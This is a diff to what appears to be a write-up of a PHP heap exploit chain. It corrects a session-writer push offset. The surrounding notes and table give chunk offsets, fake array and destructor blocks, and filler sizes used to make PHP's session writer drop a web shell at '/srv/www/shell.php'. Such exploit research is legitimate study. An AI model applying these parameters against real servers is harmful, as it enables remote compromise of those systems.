@@ -283,7 +283,7 @@ the session writer in three decode steps:
      container), which scalarizes the progress array.
    * R2b: `chunk+0x63050` — the value half of the same zval, pointed at a fake
      8-slot array.
-   * R3: negative `used_slots` lands the push at `chunk+0x58250`
+   * R3: negative `used_slots` lands the push at `chunk+0x58190`
      (= `E_OFF+16 + 8*LAST_DELTA`, in the session-write plumbing), while the same
      request's fake dtor block carries the count `19` and the bytes
      `"/srv/www/shell.php"` — the decoder takes those as the write target.
@@ -318,8 +318,8 @@ the chunk layout stay put.  The whole chain takes ~11.6 s.
 | --- | --- | --- |
 | `E_OFF` | `chunk + 0x76000` | stale `var_entries` block (= filler page 118, `ENTPAGE`) |
 | `DT_OFF` | `chunk + 0xDC000` | stale `var_dtor_entries` block (= filler page 220, `DTPAGE`) |
-| push targets | `0x63058` scalarize, `0x63050` fake array, `0x58250` session writer | `E_OFF + 16 + 8*used_slots` |
-| `LAST_DELTA` | `-0x3BD0` | negative `used_slots`, aims the push backwards at `0x58250` |
+| push targets | `0x63058` scalarize, `0x63050` fake array, `0x58190` session writer | `E_OFF + 16 + 8*used_slots` |
+| `LAST_DELTA` | `-0x3BD0` | negative `used_slots`, aims the push backwards at `0x58190` |
 | progress block | `chunk + 0x63000` | `php_session_rfc1867_progress`, 144 bytes |
 | filler field | `FILLER=540672` B starting at page `FSTART=100` | the fake blocks are patched at absolute chunk offsets |
 | session records | `SMALL=73` + one `FNLEN=1000000` B filename | the `build_A()` prelude of prime |
